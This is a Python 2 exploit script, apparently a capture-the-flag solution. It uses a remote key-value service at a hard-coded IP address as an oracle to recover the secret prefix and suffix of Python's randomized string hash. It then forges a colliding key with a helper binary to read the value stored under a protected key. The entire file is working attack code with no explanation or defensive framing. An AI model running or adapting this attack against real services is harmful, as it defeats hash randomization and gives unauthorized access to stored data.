import requests
import sys
import json
import time
import subprocess
import ast

candidates = []
solutions = []
mask = 0xffffffffffffffff

def bytes_hash( p, prefix, suffix ):
  if len(p) == 0: return 0
  x = prefix ^ (ord( p[0] )<<7)
  for i in range( len(p) ):
    x = ( ( x * 1000003 ) ^ ord(p[i]) ) & mask
  x ^= len(p) ^ suffix
  if x == -1: x = -2
  return x

def solvebit( h1, h2, prefix, bits ):
  f1 = 1000003
  f2 = f1*f1
  target = h1^h2^3
  if bits == 64:
    if ((f1*prefix)^(f2*prefix)^target) & mask: return
    suffix = h1^1^(f1*prefix)
    suffix&= mask
    candidates.append( (prefix,suffix) )
  else:
    if ((f1*prefix)^(f2*prefix)^target) & ((1<<bits)-1):
      return
    solvebit(h1,h2,prefix,bits + 1)
    solvebit(h1,h2,prefix + (1 << bits),bits + 1)

def oracle(key):
  time.sleep(0.5)
  r = requests.post('http://52.6.62.188:9009/set',
        data=json.dumps({"key": key, "value": "bar"}),
        headers={'content-type':'application/json'})
  return int(json.loads(r.content)['key'])

def escape_json(key):
  res = ""
  for c in key:
    if r'\x' in repr(c):
      res += r'\u%04x' % ord(c)
    elif c == "'":
      res += "'"
    elif c == '"':
      res += r'\"'
    else:
      res += repr(c)[1:-1]
  return res

def retrieve(key):
  time.sleep(0.5)
  dat = '{"key": "%s"}' % escape_json(key)
  print "Sending request:", dat
  r = requests.post('http://52.6.62.188:9009/get',
        data=dat,
        headers={'content-type':'application/json'})
  return r.content

def ttl():
  time.sleep(0.5)
  r = requests.get('http://52.6.62.188:9009/status')
  return int(json.loads(r.content)['ttl'])

def collide(key, pref, suf):
  p = subprocess.Popen(['./collide', key, str(pref), str(suf)],
          stdout=subprocess.PIPE, stdin=subprocess.PIPE)
  return ast.literal_eval(p.communicate('')[0].strip())

t = ttl()
print "TTL", t

key_key = "you_want_it_LOLOLOL?"
h2 = oracle("\0\0")   & mask
h1 = oracle("\0")     & mask

solvebit(h1, h2, 0, 0)

print "%d candidate solutions" % len(candidates)

for i in range(len(candidates)):
  print i
  s = candidates[i]
  if bytes_hash("python",s[0],s[1]) == oracle("python") & mask:
    ok=1
    for i in range(5)[1:]:
      if bytes_hash("\3"*i,s[0],s[1]) != oracle("\3"*i) & mask:
        ok=0
    if ok:
      print("%016x %016x" % (s[0],s[1]))
      collision = collide(key_key, s[0], s[1])
      print "Found collision:", repr(collision)
      print retrieve(collision)
